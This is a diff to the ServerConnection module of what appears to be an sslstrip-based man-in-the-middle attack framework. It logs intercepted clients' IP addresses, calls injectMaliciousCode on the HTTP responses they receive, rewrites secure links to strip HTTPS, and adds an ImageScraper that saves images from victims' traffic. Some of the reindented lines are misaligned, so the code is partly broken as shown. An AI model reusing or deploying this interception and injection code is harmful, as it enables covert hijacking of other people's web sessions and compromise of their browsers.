@@ -40,6 +40,7 @@ from main.models import *
 
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
+from ImageScraper import ImageScraper
 
 class ServerConnection(HTTPClient):
 
@@ -73,15 +74,15 @@ class ServerConnection(HTTPClient):
         self.injection = module.active
         #print "using sslstrip"
 
-	   #Injection Manager (uses settins to determine injection rate)
+       #Injection Manager (uses settins to determine injection rate)
     def injectManager(self, clientip):
         settings = setup.objects.get(id = "1")
-		   #Set Injection Bit
+           #Set Injection Bit
         print "Injection Sent to: " + clientip
         print "Pausing Injection for " + settings.injectrate + " secs..."
         iptrack.objects.filter(address = clientip).update(injected = "1")
 
-		   #Reset inject	
+           #Reset inject    
         time.sleep(int(settings.injectrate))
         print "Resuming Injection"
         iptrack.objects.filter(address = clientip).update(injected = "0")
@@ -180,79 +181,86 @@ class ServerConnection(HTTPClient):
 
        if self.length == 0:
            self.shutdown()
+
+    ######################
+    # editz by Johnny
                         
     def handleResponsePart(self, data):
-        if (self.isImageRequest):
-            self.client.write(data)
-        else:
-            HTTPClient.handleResponsePart(self, data)
+        HTTPClient.handleResponsePart(self, data)
+
 
     def handleResponseEnd(self):
-        if (self.isImageRequest):
-            #self.setCORSHeaders()
-            self.shutdown()
-        else:
-	    try:
+        try:
                 HTTPClient.handleResponseEnd(self)
-	    except:
-		pass
+        except:
+          pass
 
     def setCORSHeaders(self):
         self.client.setHeader("Access-Control-Allow-Credentials", "true")
         self.client.setHeader("Access-Control-Allow-Origin", "*")
 
     def handleResponse(self, data):
+
         if (self.isCompressed):
             logging.debug("Decompressing content...")
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
-           
-        #print data           
-        ####################################    
-            #Data manipulation determination
-            #0sm0s1z
-            
-        with open(str(os.path.dirname(os.path.abspath(__file__))) + '/clientip', 'r') as file:
-            clientip = file.readlines()    
-            
-        print clientip, "is using sslstrip"
-        
-        iptrack.objects.filter(id = "1").update(address = clientip[0])    
-        
-            #Check for Existing IP Address
-        try:
-           check = iptrack.objects.exclude(id = "1").get(address = clientip[0])
 
-               #Check for uninjected IP Address   
-           if check.injected == "0":
-              if len(self.injection) > 2: 
-                  data = self.injectMaliciousCode(data, clientip[0])
-                    
-        except:
-            newip = iptrack(address = clientip[0], injected = "0")
-            newip.save()
-            print "New Client Detected! %s" % clientip[0]
-            if len(self.injection) > 2: 
-               data = self.injectMaliciousCode(data, clientip[0])            
-               #print data     
+        if self.isImageRequest:
+            print "IMAGE"
+            imageScraper = ImageScraper(self.headers['host'], self.client, data)
+            imageScraper.save()
+
+        else:
+            #print data           
+            ####################################    
+                #Data manipulation determination
+                #0sm0s1z
                 
-        
-        ####################################       
+            with open(str(os.path.dirname(os.path.abspath(__file__))) + '/clientip', 'r') as file:
+                clientip = file.readlines()    
+                
+            print clientip, "is using sslstrip"
             
-        logging.log(self.getLogLevel(), "Read from server:\n" + data)
+            iptrack.objects.filter(id = "1").update(address = clientip[0])
 
-        data = self.replaceSecureLinks(data)
+            
+                #Check for Existing IP Address
+            try:
+               check = iptrack.objects.exclude(id = "1").get(address = clientip[0])
 
-        if (self.contentLength != None):
-            self.client.setHeader('Content-Length', len(data))
-        
-	try:
-        	self.client.write(data)
-	except:
-		pass
-	try:
+                   #Check for uninjected IP Address   
+               if check.injected == "0":
+                  if len(self.injection) > 2: 
+                      data = self.injectMaliciousCode(data, clientip[0])
+                        
+            except:
+                newip = iptrack(address = clientip[0], injected = "0")
+                newip.save()
+                print "New Client Detected! %s" % clientip[0]
+                if len(self.injection) > 2: 
+                   data = self.injectMaliciousCode(data, clientip[0])            
+                   #print data     
+                    
+            
+            ####################################       
+                
+            logging.log(self.getLogLevel(), "Read from server:\n" + data)
+
+            data = self.replaceSecureLinks(data)
+
+            if (self.contentLength != None):
+                self.client.setHeader('Content-Length', len(data))
+
+
+
+        try:
+            self.client.write(data)
+        except:
+           pass
+        try:
             self.shutdown()
-	except:
-	    pass
+        except:
+            pass
 
     def replaceSecureLinks(self, data):
         iterator = re.finditer(ServerConnection.urlExpression, data)
@@ -272,8 +280,8 @@ class ServerConnection(HTTPClient):
     def shutdown(self):
         if not self.shutdownComplete:
             self.shutdownComplete = True
-	    try:
+        try:
                 self.client.finish()
-	    except:
-		pass
+        except:
+        pass
             self.transport.loseConnection()
